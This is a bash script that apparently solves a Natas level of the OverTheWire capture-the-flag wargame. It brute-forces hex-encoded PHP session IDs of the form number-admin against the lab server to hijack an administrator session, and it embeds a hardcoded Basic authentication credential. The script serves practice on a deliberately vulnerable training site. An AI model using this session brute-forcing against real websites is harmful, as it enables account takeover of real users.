#! /bin/bash

for SEQ in {0..640}
do
  # PHPSESSID is the hexadecimal representation of "randomnum-username"
  SESSIONSTR="${SEQ}-admin"
  SESSIONID="$(echo -n ${SESSIONSTR} | xxd -p)"
  echo "${SEQ}: ${SESSIONID}"

  curl --silent \
    'http://natas19.natas.labs.overthewire.org/index.php?debug' \
    -H 'Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==' \
    -H "Cookie: PHPSESSID=${SESSIONID}" \
    --data 'username=admin&password=foo' \
    | grep "regular" >/dev/null

  if [ $? -ne 0 ]; then
    # if the string "regular user" is not present, that probably means we
    # found the admin session?
    break;
  fi
done
